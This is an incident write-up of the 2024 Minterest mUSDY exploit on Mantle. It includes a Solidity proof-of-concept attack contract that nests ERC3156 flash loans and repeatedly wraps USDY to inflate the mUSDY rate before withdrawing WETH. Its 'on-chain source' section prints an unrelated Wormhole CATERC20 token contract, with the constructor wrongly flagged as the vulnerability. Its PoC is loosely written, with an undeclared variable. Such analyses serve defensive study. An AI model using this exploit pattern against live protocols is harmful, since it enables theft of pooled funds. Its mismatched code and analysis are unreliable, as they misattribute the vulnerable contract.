# Minterest — mUSDY Oracle Manipulation via ERC3156 Flash Loan Analysis

| Item | Details |
|------|------|
| **Date** | 2024-07-22 |
| **Protocol** | Minterest |
| **Chain** | Mantle |
| **Loss** | ~427 ETH |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contracts** | Musdy (mUSDY), Musd (USDY wrapper), Meth lending |
| **Root Cause** | Missing `nonReentrant` on `wrap()` allows recursive calls within callback — repeated wrapping causes mUSDY exchange rate to exceed actual collateral, enabling over-borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/Minterest_exp.sol) |

---

## 1. Vulnerability Overview

Minterest's mUSDY lending protocol wrapped USDY tokens into mUSDY, and then used mUSDY as lending collateral. The attacker manipulated the mUSDY exchange rate through a cyclic pattern — within an `onFlashLoan` callback that recursively invoked ERC3156 flash loans 24 times, wrapping USDY into mUSDY and then borrowing against mUSDY. Ultimately, the manipulated exchange rate was used to borrow 223 WETH and 204 mETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: allows recursive wrap-borrow within onFlashLoan
function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
) external returns (bytes32) {
    // ❌ Allows wrapping that affects mUSDY exchange rate inside flash loan callback
    uint256 wrapAmount = amount - iterationDecrement;
    IMusd(MUSD).wrap(wrapAmount);  // ❌ Rate manipulation
    IMusdy(MUSDY).flashLoan(address(this), token, maxLoan, data);  // ❌ Recursive flash loan
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}

// ✅ Correct code: disable rate-changing functions during flash loan
modifier noFlashLoanActive() {
    require(!_flashLoanActive, "Flash loan in progress");
    _;
}
function wrap(uint256 amount) external noFlashLoanActive { ... }  // ✅ Disabled during flash loan
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: CATERC20.sol
contract CATERC20 is Context, ERC20, CATERC20Governance, CATERC20Events, ERC165 {
	using SafeERC20 for IERC20;
	
	constructor(string memory name, string memory symbol, uint8 decimal) ERC20(name, symbol) {  // ❌ Vulnerability
		setEvmChainId(block.chainid);
		setDecimals(decimal);
	}
	
	function initialize(
		uint16 chainId,
		address wormhole,
		uint8 finality,
		uint256 maxSupply
	) public onlyOwner {
		require(isInitialized() == false, "Already Initialized");
		
		setChainId(chainId);
		setWormhole(wormhole);
		setFinality(finality);
		setMaxSupply(maxSupply);
		setMintedSupply(0);
		setIsInitialized();
	}
	
	function decimals() public view virtual override returns (uint8) {
		return getDecimals();
	}
	
	function supportsInterface(
		bytes4 interfaceId
	) public view virtual override(ERC165) returns (bool) {
		return interfaceId == type(ICATERC20).interfaceId || super.supportsInterface(interfaceId);
	}
	
	/**
	 * @dev To bridge tokens to other chains.
     */
	function bridgeOut(
		uint256 amount,
		uint16 recipientChain,
		bytes32 recipient,
		uint32 nonce
	) external payable returns (uint64 sequence) {
		require(isInitialized() == true, "Not Initialized");
		require(evmChainId() == block.chainid, "unsupported fork");
		
		uint256 fee = wormhole().messageFee();
		require(msg.value >= fee, "Not enough fee provided to publish message");
		uint16 tokenChain = wormhole().chainId();
		bytes32 tokenAddress = bytes32(uint256(uint160(address(this))));
		
		_burn(_msgSender(), amount);
		
		CATERC20Structs.CrossChainPayload memory transfer = CATERC20Structs.CrossChainPayload({
			amount: amount,
			tokenAddress: tokenAddress,
			tokenChain: tokenChain,
			toAddress: recipient,
			toChain: recipientChain,
			tokenDecimals: getDecimals()
		});
		
		sequence = wormhole().publishMessage{value: msg.value}(
			nonce,
			encodeTransfer(transfer),
			finality()
		);
		
		emit bridgeOutEvent(
			amount,
			tokenChain,
			recipientChain,
			addressToBytes(_msgSender()),
			recipient
		);
	} // end of function
	
	function bridgeIn(bytes memory encodedVm) external returns (bytes memory) {
		require(isInitialized() == true, "Not Initialized");
		require(evmChainId() == block.chainid, "unsupported fork");
		
		(IWormhole.VM memory vm, bool valid, string memory reason) = wormhole().parseAndVerifyVM(
			encodedVm
		);
		require(valid, reason);
		require(
			bytesToAddress(vm.emitterAddress) == address(this) ||
			tokenContracts(vm.emitterChainId) == vm.emitterAddress,
			"Invalid Emitter"
		);
		
		CATERC20Structs.CrossChainPayload memory transfer = decodeTransfer(vm.payload);
		address transferRecipient = bytesToAddress(transfer.toAddress);
		
		require(!isTransferCompleted(vm.hash), "transfer already completed");
		setTransferCompleted(vm.hash);
		
		require(transfer.toChain == wormhole().chainId(), "invalid target chain");
		
		uint256 nativeAmount = normalizeAmount(
			transfer.amount,
			transfer.tokenDecimals,
			getDecimals()
		);
		
		_mint(transferRecipient, nativeAmount);
		
		emit bridgeInEvent(nativeAmount, transfer.tokenChain, transfer.toChain, transfer.toAddress);
		
		return vm.payload;
	}
	
	function mint(address recipient, uint256 amount) public onlyOwner {
		require(mintedSupply() + amount <= maxSupply(), "MAX SUPPLY REACHED");
		setMintedSupply(mintedSupply() + amount);
		_mint(recipient, amount);
	}
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Call myFunction(): initiate mUSDY flash loan
  │
  ├─[2]─► onFlashLoan callback (repeated 24 times):
  │         ├─► Wrap USDY → mUSDY (wrapAmount decrements progressively)
  │         ├─► Re-borrow mUSDY → mUSDY (recursive)
  │         └─► Exchange rate shifts with each iteration
  │
  ├─[3]─► Borrow from WETH/mETH lending pool at manipulated mUSDY rate
  │         └─► Meth contract: withdraw 223 WETH + 204 mETH
  │
  ├─[4]─► Repay flash loan (minimum amount)
  │
  └─[5]─► Total loss: ~427 ETH
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    uint256 constant ITERATIONS = 24;
    uint256 wrapDecrement = 383_000_000_000_000; // decrements each iteration

    function myFunction() external {
        // [1] Initial mUSDY flash loan
        uint256 maxLoan = IMusdy(MUSDY).maxFlashLoan(address(mUSDY));
        IMusdy(MUSDY).flashLoan(address(this), address(mUSDY), maxLoan, "");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        if (iterationsLeft > 0) {
            iterationsLeft--;
            // [2] Wrap USDY into mUSDY — exchange rate manipulation
            uint256 wrapAmt = amount - (iterationsLeft * wrapDecrement);
            IMusd(MUSD).wrap(wrapAmt);

            // [3] Recursive flash loan
            uint256 nextLoan = IMusdy(MUSDY).maxFlashLoan(address(mUSDY));
            IMusdy(MUSDY).flashLoan(address(this), address(mUSDY), nextLoan, "");
        } else {
            // [4] Borrow WETH/mETH at manipulated exchange rate
            IMeth(METH).redeemUnderlying(223 ether); // withdraw WETH
        }
        IERC20(token).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Oracle Manipulation — `wrap()` function allows recursive calls within flash loan callback; repeated wrapping causes mUSDY exchange rate to exceed actual collateral ratio |
| **Attack Technique** | Recursive wrap() mUSDY Rate Manipulation (ERC3156 flash loan serves as auxiliary funding mechanism) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | Critical |
| **Attack Complexity** | High |

## 6. Remediation Recommendations

1. **Block rate changes during flash loans**: Disable functions that affect the exchange rate (e.g., `wrap()`) while a flash loan is active.
2. **Prevent recursive flash loans**: Restrict nested flash loan calls within the same block.
3. **Detect rate manipulation**: Set an upper bound on exchange rate variance within a single transaction.
4. **Recalculate collateral value**: Re-validate collateral value using the final exchange rate after flash loan completion.

## 7. Lessons Learned

- **ERC3156 recursive risk**: The ERC3156 flash loan standard's callback allows calling another flash loan from the same protocol, enabling recursive manipulation.
- **Complexity of rate manipulation**: Rather than a simple price manipulation, the attack progressively manipulated the protocol's internal exchange rate calculation logic across 24 steps.
- **Cross-contract vulnerability**: The interdependent structure of three contracts — Musdy, Musd, and Meth — created a complex attack surface.